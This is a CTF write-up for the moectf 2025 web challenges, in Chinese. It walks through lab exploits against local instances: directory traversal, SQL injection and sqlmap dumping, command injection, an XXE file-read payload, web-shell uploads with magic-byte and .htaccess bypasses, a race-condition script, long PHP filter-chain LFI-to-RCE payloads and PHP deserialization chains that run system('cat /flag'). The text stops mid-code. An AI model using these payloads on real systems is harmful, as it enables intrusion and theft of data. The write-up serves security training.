---
title: moectf 2025 WriteUp
author:
  - from Web for Test
---

# 西电CTF2025


环境配置

```nmap
https://github.com/XDSEC/WebSocketReflectorX/releases/download/0.2.22/WebSocketReflectorX-0.2.22-win64.exe
```

![image](http://139.196.222.108:40061/i/2025/08/09/u95y2w-0.png)​

# Web

## 0 Web入门指北

复制到控制台直接出

![2f04bdb93c08313b6acb71f6e68312ce](http://139.196.222.108:40061/i/2025/09/11/m94qvk-0.png)​

‍

## 01 第一章 神秘的手镯

右击源码，flag在shouzhuo.js里面

![image](http://139.196.222.108:40061/i/2025/08/09/u9re8a-0.png)​

`moectf{f_i2_1s_Your_g00d_fri3nd!!}`​

‍

‍

## 02 第二章 初识金曦玄轨

![image](http://139.196.222.108:40061/i/2025/08/09/ud70f2-0.png)​

![image](http://139.196.222.108:40061/i/2025/08/09/udda61-0.png)​

‍

## 03 第三章 问剑石！篡天改命！

```nmap
POST /test_talent?level=S HTTP/1.1
Host: 127.0.0.1:53447
sec-ch-ua-mobile: ?0
Sec-Fetch-Mode: cors
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Sec-Fetch-Dest: empty
sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
Content-Type: application/json
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:53447
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://127.0.0.1:53447/
Content-Length: 24

{"manifestation":"flowing_azure_clouds"}
```

‍

## 04 第四章 金曦破禁与七绝傀儡阵

> 省流：http请求有很多讲究！试试吧！

![image](http://139.196.222.108:40061/i/2025/08/09/vmzszs-0.png)​

‍

‍

![image](http://139.196.222.108:40061/i/2025/08/09/vnq6zo-0.png)​

玉简碎片：`bW9lY3Rme0Mw`​

![image](http://139.196.222.108:40061/i/2025/08/09/vohmmr-0.png)​

玉简碎片：`bjZyNDd1MTQ3`​

![image](http://139.196.222.108:40061/i/2025/08/09/vpf21v-0.png)​

玉简碎片：`MTBuNV95MHVy`​

![image](http://139.196.222.108:40061/i/2025/08/09/vr76ko-0.png)​

玉简碎片：`X2g3N1BfbDN2`​

![image](http://139.196.222.108:40061/i/2025/08/09/vsl0z2-0.png)​

玉简碎片：`M2xfMTVfcjM0`​

![image](http://139.196.222.108:40061/i/2025/08/09/vuq92b-0.png)​

玉简碎片:`bGx5X2gxOWgh`​

‍

![image](http://139.196.222.108:40061/i/2025/08/09/w06vjd-0.png)​

玉简碎片:`fQ==`​

![image](http://139.196.222.108:40061/i/2025/08/09/w0rko2-0.png)​

‍

## 05 第五章 打上门来！

目录穿越

?file=../../../flag

![image](http://139.196.222.108:40061/i/2025/08/09/vlsj0o-0.png)​

‍

## 06 第六章 藏经禁制？玄机初探！

SQL注入，直接万能密码进

剧情里说“不给账号密码”，说明要直接绕过。

后端的大概

```python
SELECT * FROM users WHERE username='$u' AND password='$p';
```

```python
' OR '1'='1
```

## 07 第七章 灵蛛探穴与阴阳双生符

> 省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎**爬虫**哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。

纯文本文件，用于告知搜索引擎**爬虫**哪些页面可以抓取，哪些页面不应被抓取。那么肯定是robots.txt文件了

![image](http://139.196.222.108:40061/i/2025/08/09/w629no-0.png)

![image](http://139.196.222.108:40061/i/2025/08/09/w6455t-0.png)

md5绕过

/flag.php?a=s1836677006a&b=s1885207154a

![image](http://139.196.222.108:40061/i/2025/08/09/w78qws-0.png)

‍

## 08 第八章 天衍真言，星图显圣

> 省流：和上次一样的界面，那我再登录一次就行了……吗？

sql注入，UNION联合注入单引号闭合的，直接sqlmap梭哈

```python
python39 sqlmap.py -u "http://127.0.0.1:54383/?username=admin&password=1" -p password --batch -D user -T flag --dump
```

‍

​	

‍

## 09 第九章 星墟禁制·天机问路

需要输入url，直接输入百度的，后面跟上|发现可以执行命令，flag在环境变量env里面

![image](http://139.196.222.108:40061/i/2025/08/17/123e8to-0.png)​

‍

## 10 第十章 天机符阵_revenge

![image](http://139.196.222.108:40061/i/2025/09/11/m94p0a-0.png)ke

可以知道是XXE漏洞

```nmap
<?xml version="1.0"?>
<!DOCTYPE contract [
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<root>
  <解析>&flag;</解析>
  <输出>%解析结果%</输出>
</root>
```

‍

## 11 第十一章 千机变·破妄之眼

> 省流：HDdss看到了 **GET** 参数名由`m,n,o,p,q`这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道**参数名等于参数值**才能进入。

`m, n, o, p, q` 的排列组合，总共 5 个字母，顺序未知，一共120种可能直接跑脚本

```python
# import requests
# from itertools import permutations
# import os
#
# # 目标 URL
# base_url = "http://127.0.0.1:51196/"
#
# # 参数字母
# letters = "mnopq"
#
# # 输出目录
# output_dir = "responses"
# os.makedirs(output_dir, exist_ok=True)
#
# # 保存状态码和异常信息
# status_file = os.path.join(output_dir, "status_codes.txt")
# error_file = os.path.join(output_dir, "errors.txt")
#
# # 配置代理
# proxies = {
#     "http": "http://127.0.0.1:59560/",
#     # "https": "http://127.0.0.1:8080"
# }
#
# for perm in permutations(letters):
#     param = ''.join(perm)
#     params = {param: param}
#     filename_base = param
#
#     try:
#         response = requests.get(base_url, params=params, timeout=10, proxies=proxies, verify=False)
#         content = response.text
#         status_code = response.status_code
#
#         # 保存页面 HTML
#         file_path = os.path.join(output_dir, f"{filename_base}.html")
#         with open(file_path, "w", encoding="utf-8") as f:
#             f.write(content)
#
#         # 记录状态码
#         with open(status_file, "a", encoding="utf-8") as f:
#             f.write(f"{param}: {status_code}\n")
#
#         # 检查是否爆破成功（页面内容异常或包含 flag.php）
#         if "flag.php" in content:
#             print(f"[+] Parameter correct: {param}")
#             print(f"[!] Flag.php detected in directory listing.")
#
#             # 🚨 访问 flag.php
#             flag_url = f"{base_url}?{param}={param}&file=./flag.php"
#             flag_response = requests.get(flag_url, timeout=10, proxies=proxies, verify=False)
#             flag_path = os.path.join(output_dir, "flag.html")
#             with open(flag_path, "w", encoding="utf-8") as f:
#                 f.write(flag_response.text)
#             print(f"[+] Flag page saved to {flag_path}")
#             break  # 停止爆破
#
#         print(f"[+] Saved {param} -> status {status_code}")
#
#     except requests.exceptions.RequestException as e:
#         with open(error_file, "a", encoding="utf-8") as f:
#             f.write(f"{param}: {e}\n")
#         print(f"[!] Request failed for {param}: {e}")
import requests
import itertools


def find_flag_url(base_url):
    # 定义可能的参数名组成字母
    letters = ['m', 'n', 'o', 'p', 'q']

    # 生成所有可能的排列组合（5个字母的全排列）
    for perm in itertools.permutations(letters):
        # 组合成参数名
        param_name = ''.join(perm)
        # 参数值等于参数名
        params = {param_name: param_name}

        try:
            # 发送GET请求
            response = requests.get(base_url, params=params, timeout=10)

            # 检查返回内容中是否包含flag.php
            if "flag.php" in response.text:
                print(f"找到包含flag.php的URL: {response.url}")
                return response.url

        except requests.exceptions.RequestException as e:
            print(f"请求错误 {param_name}: {e}")
            continue

    print("未找到包含flag.php的URL")
    return None


if __name__ == "__main__":
    # 请替换为目标基础URL
    base_url = "http://127.0.0.1:59560/"  # 替换成实际要测试的URL
    result = find_flag_url(base_url)

```

访问flag.php还是无法查看，应该是被注释了

![image](http://139.196.222.108:40061/i/2025/08/27/fnwn5-0.png)

使用伪协议读取

php://filter/read=convert.base64-encode/resource=flag.php

![image](http://139.196.222.108:40061/i/2025/08/27/gahx4-0.png)

![image](http://139.196.222.108:40061/i/2025/08/27/gc4hv-0.png)

‍

‍

## 12 第十二章 玉魄玄关·破妄

直接蚁剑连

![image](http://139.196.222.108:40061/i/2025/08/18/nx0ou-0.png)

flag在env里面

![image](http://139.196.222.108:40061/i/2025/08/18/p2xoz-0.png)​

‍

‍

## 13 第十三章 通幽关·灵纹诡影

随机上传一个文件提示

> 九幽雷劫！  
> 噬心魔印校验失败！  
> 预期魔印：ffd8ff  
> 检测到魔印：474946  
> 返回灵纹上传

![image](http://139.196.222.108:40061/i/2025/08/18/opz9o-0.png)​

需要文件头是ffd8ff开头的后面直接跟一句话木马

![image](http://139.196.222.108:40061/i/2025/08/18/x0qby-0.png)​

![image](http://139.196.222.108:40061/i/2025/08/18/x3gaz-0.png)​

‍

## 14 第十四章 御神关·补天玉碑

> 省流：Apache有一个特殊文件，是什么呢？

直接利用.htaccess绕过php后缀的限制

```nmap
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

‍

‍

在上传一句话木马

![image](http://139.196.222.108:40061/i/2025/08/18/yua5r-0.png)


## Moe笑传之猜猜爆
``` Java
直接改源码 猜对的条件改为
if(userGuess !== randomNumber) {
直接秒了
```

## 摸金偶遇FLAG，拼尽全力难战胜

``` C++
其实这个题最简单的做法是在控制台把速度拉慢
```
``` JavaScript
注入脚本：计时器掌控者，直接输进控制台无敌了
```
```python
import requests
import time

# 摩斯密码到数字的映射
MORSE_CODE_MAP = {
    "·━━━━": "1",
    "··━━━": "2",
    "···━━": "3",
    "····━": "4",
    "·····": "5",
    "━····": "6",
    "━━···": "7",
    "━━━··": "8",
    "━━━━·": "9",
    "━━━━━": "0"
}


def main():
    print("开始破译电脑挑战...")

    # 创建会话对象，保持 cookies 等状态
    session = requests.Session()

    # 添加浏览器请求头，模拟真实访问
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Referer": "http://127.0.0.1:62202/",  # 替换为实际页面URL
        "Accept": "application/json, text/plain, */*"
    }
    session.headers.update(headers)

    try:
        # 1. 先访问首页（获取必要的 cookies 或会话信息）
        print("初始化会话...")
        session.get("http://127.0.0.1:62202/")  # 替换为实际页面URL
        time.sleep(1)  # 模拟页面加载延迟

        # 2. 获取挑战数据
        print("获取挑战数据...")
        challenge_response = session.get("http://127.0.0.1:62202/get_challenge?count=9")
        challenge_response.raise_for_status()
        challenge = challenge_response.json()

        if "error" in challenge:
            print(f"获取挑战失败: {challenge['error']}")
            return

        numbers = challenge["numbers"]
        token = challenge["token"]
        print(f"获取到密码: {numbers}，token: {token}")

        # 3. 模拟解析过程（实际场景中应根据摩斯密码解析，这里直接使用numbers作为答案）
        answers = numbers
        print(f"解析完成，答案: {answers}")

        # 4. 提交验证（添加延迟，模拟人工操作时间）
        print("提交验证...")
        time.sleep(2)  # 模拟用户输入耗时
        verify_response = session.post(
            "http://127.0.0.1:62202/verify",
            json={"answers": answers, "token": token}
        )
        verify_response.raise_for_status()
        result = verify_response.json()

        if result.get("correct", False):
            print(f"验证成功！FLAG: {result.get('flag')}")
        else:
            print(f"验证失败: {result.get('message', '未知原因')}")

    except requests.exceptions.HTTPError as e:
        print(f"HTTP错误: {e}")
        # 打印响应内容，辅助排查问题
        if hasattr(e, 'response') and e.response is not None:
            print(f"服务器响应: {e.response.text}")
    except Exception as e:
        print(f"发生错误: {str(e)}")


if __name__ == "__main__":
    main()

```

‍

## 15 第十五章 归真关·竞时净魔

> 省流：图片上传至/uploads

![image](http://139.196.222.108:40061/i/2025/08/28/53fvc-0.png)​

```php
# -*- coding: utf-8 -*-
import threading
import requests
import time

BASE = "http://127.0.0.1:63161/"
TARGET = BASE + "/uploads/1.php"
THREADS = 10
TIMEOUT = 2

stop = threading.Event()
counter = {"req": 0, "hit": 0}
lock = threading.Lock()


def fetcher(idx):
    sess = requests.Session()
    while not stop.is_set():
        try:
            url = f"{TARGET}?_={int(time.time() * 1000)}"
            r = sess.get(url, timeout=TIMEOUT)

            with lock:
                counter["req"] += 1

            if r.status_code == 200:
                with lock:
                    counter["hit"] += 1
                print(f"[HIT] Thread-{idx} got 200, len={len(r.content)}")
                print(" 前20字节:", r.content[:20])

        except Exception as e:
            pass


def reporter():
    while not stop.is_set():
        time.sleep(3)
        with lock:
            print(f"[STAT] total={counter['req']} hits={counter['hit']}")


if __name__ == "__main__":
    print("[*] 疯狂访问:", TARGET)
    # 此处原代码缺少线程启动部分，完整代码应添加线程创建和启动逻辑
    for i in range(THREADS):
        threading.Thread(target=fetcher, args=(i,), daemon=True).start()
    threading.Thread(target=reporter, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop.set()
        print("[*] 停止。")

```

![image](http://139.196.222.108:40061/i/2025/08/28/5fck5-0.png)

当看到GIF89a的时候说明上传成功

![image](http://139.196.222.108:40061/i/2025/08/28/5lcd5-0.png)

‍

## 16 第十六章 昆仑星途

LFI -> RCE

https://github.com/synacktiv/php_filter_chain_generator

```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![image](http://139.196.222.108:40061/i/2025/08/26/yvuy5a-0.png)​

因为cat /flag-rebkim1IhTqMqmhVal1faMQBbSeNGC.txt生成的payload太长所以直接使用通配符cat /fl*

```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![image](http://139.196.222.108:40061/i/2025/08/26/yy7ot6-0.png)​

‍

## 17 第十七章 星骸迷阵·神念重构

```php
<?php
highlight_file(__FILE__);

class A {
    public $a;
    function __destruct() {
        eval($this->a);
    }
}

if(isset($_GET['a'])) {
    unserialize($_GET['a']);
}
```

php反序列化漏洞。当对象销毁（脚本结束或 `unset`）时，会触发 `__destruct()`。

```php
<?php
highlight_file(__FILE__);

class A {
    public $a;
    function __destruct() {
        eval($this->a);
    }
}

//if(isset($_GET['a'])) {
//    unserialize($_GET['a']);
//}

$o = new A();
$o->a = 'system("cat /flag");';  // 想执行的命令
echo serialize($o);
```
``` php
[127.0.0.1:49509/?a=O:1:"A":1:{s:1:"a";s:20:"system(%27cat /flag%27);";}](http://127.0.0.1:49509/?a=O:1:%22A%22:1:{s:1:%22a%22;s:20:%22system\(%27cat%20/flag%27\);%22;})
```



![image](http://139.196.222.108:40061/i/2025/08/26/z4ald9-0.png)

‍

## 18 第十八章 万卷诡阁·功法连环

```php
<?php
highlight_file(__FILE__);

class PersonA {
    private $name;
    function __wakeup() {
        $name=$this->name;
        $name->work();
    }
}

class PersonB {
    public $name;
    function work(){
        $name=$this->name;
        eval($name);
    }

}

if(isset($_GET['person'])) {
    unserialize($_GET['person']);
}
```

同样还是反序列化漏洞，需要利用反射突破private的限制

![image](http://139.196.222.108:40061/i/2025/08/26/zaojg8-0.png)

![image](http://139.196.222.108:40061/i/2025/08/26/zasc2c-0.png)

![image](http://139.196.222.108:40061/i/2025/08/26/z8vjl0-0.png)​

![image](http://139.196.222.108:40061/i/2025/08/26/z9izfl-0.png)​

‍

```php
<?php
//highlight_file(__FILE__);

class PersonA {
    private $name;
    function __wakeup() {
        $name=$this->name;
        $name->work();
    }
}

class PersonB {
    public $name;
    function work(){
        $name=$this->name;
        eval($name);
    }

}

$o = new PersonA();
$p = new PersonB();
$p->name = 'system("cat /flag");';
$o_reflection = new ReflectionProperty('PersonA','name');
$o_reflection->setAccessible(true);
$o_reflection->setValue($o,$p);

echo urlencode(serialize($o));


```

![image](http://139.196.222.108:40061/i/2025/08/26/zak3di-0.png)

![image](http://139.196.222.108:40061/i/2025/08/26/zccum4-0.png)

‍

## 19 第十九章 星穹真相·补天归源

```php
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $age = $this->age;
        $name->$id($age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(str_contains($this->age . $this->name,"flag"))
        {
            die("Hacker!");
        }
        $name = $this->name;
        $name($age);
    }

    public function __wakeup()
    {
        $age = $this->age;
        $name = $this->id;
        $name->age = $age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

又又又又是反序列化

这里的`__Check`是自定义的函数，并不是魔术方法

> 反序列化触发 → PersonC->__wakeup()  
> → Person->__invoke()  
>  → (辅助操作，为属性赋值)  
> → 脚本结束触发 PersonA->__destruct()  
> → PersonC->__Check()  
>  → system('cat /flag') (执行命令)

```php
<?php
//highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $age = $this->age;
        $name->$id($age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(str_contains($this->age . $this->name,"flag"))
        {
            die("Hacker!");
        }
        $name = $this->name;
        $name($age);
    }

    public function __wakeup()
    {
        $age = $this->age;
        $name = $this->id;
        $name->age = $age;
        $name($this);
    }
}
$a = new PersonA();       // 触发__destruct的入口
$c = new PersonC();       // 用于触发__Check方法
$b = new PersonB();       // 用于处理属性赋值
$p_id = new Person();     // 处理__wakeup中的调用

// 配置PersonA（触发__destruct）
$a->name = $c;            // 调用对象：PersonC实例
$a->id = '__Check';       // 调用方法：__Check
$a->age = 'cat /flag';           // 要执行的命令：ls

// 配置PersonC
$c->id = $p_id;           // 修复__wakeup的空对象问题
$c->age = 'safe';         // 绕过flag检查
$c->name = 'system';      // 使用system函数执行命令

// 配置p_id
$p_id->id = $b;
$p_id->name = 'valid';

echo urlencode(serialize($a));

```

‍

‍

## 19 第十九章_revenge

```php
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
